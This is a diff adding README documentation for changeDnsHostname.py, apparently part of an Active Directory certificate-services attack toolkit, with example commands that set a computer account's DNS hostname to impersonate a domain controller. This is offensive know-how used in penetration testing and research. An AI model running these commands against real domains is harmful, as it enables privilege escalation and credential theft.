@@ -191,6 +191,19 @@ AD CS attack options:
   -v TARGET, --victim TARGET
                         Victim username or computername$, to request the correct certificate name.
 ```
+## changeDnsHostname.py
+modified from addspn.py
+
+usage: 
+```
+changeDnsHostname.py [-h] [-u USERNAME] [-p PASSWORD] [-t TARGET] [-T TARGETTYPE] [-d DNSHOSTNAME] [-r] [-q] [-a]
+                              HOSTNAME
+example: 
+  search: 
+    python3 changeDnsHostname.py -u 'red.local\Computer1$' -p Password1 -t 'Computer1$' -q 10.10.100.67
+  change:
+   python3 changeDnsHostname.py -u 'red.local\Computer1$' -p Password1 -t 'Computer1$' -d 'DC01.red.local' -r 10.10.100.67
+```
 
 ### TODO:
 - Specifying SMB as target is not yet complete, it's recommended to run in export mode and then use secretsdump with `-k`
